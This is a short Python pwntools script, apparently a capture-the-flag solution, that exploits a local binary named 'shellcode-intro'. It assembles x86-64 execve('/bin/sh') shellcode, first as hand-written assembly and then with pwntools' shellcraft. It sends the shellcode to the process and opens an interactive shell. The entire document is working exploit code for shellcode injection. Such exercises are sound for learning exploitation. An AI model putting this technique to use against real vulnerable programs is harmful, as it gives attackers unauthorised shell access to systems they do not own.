from pwn import *
from binascii import hexlify

# i stole this from the internet
ASSEMBLY = """
  xor rsi,rsi
  push rsi
  mov rdi,0x68732f2f6e69622f
  push rdi
  push rsp
  pop rdi
  push 59
  pop rax
  cdq
  syscall
"""
# using pwntools
ASSEMBLY = shellcraft.amd64.linux.execve("/bin/sh")

p = process("./shellcode-intro")

log.info("!!!HACKING IN PROGRESS!!!")
shellcode = asm(ASSEMBLY, arch="amd64", os="linux", bits=64)

log.info("Shellcode prepared: " + hexlify(shellcode).decode("utf-8"))

print(p.recv().decode("utf-8"))

log.info("Sending evil shelcode...")
p.send(shellcode)
p.send(b"\n")

p.interactive()
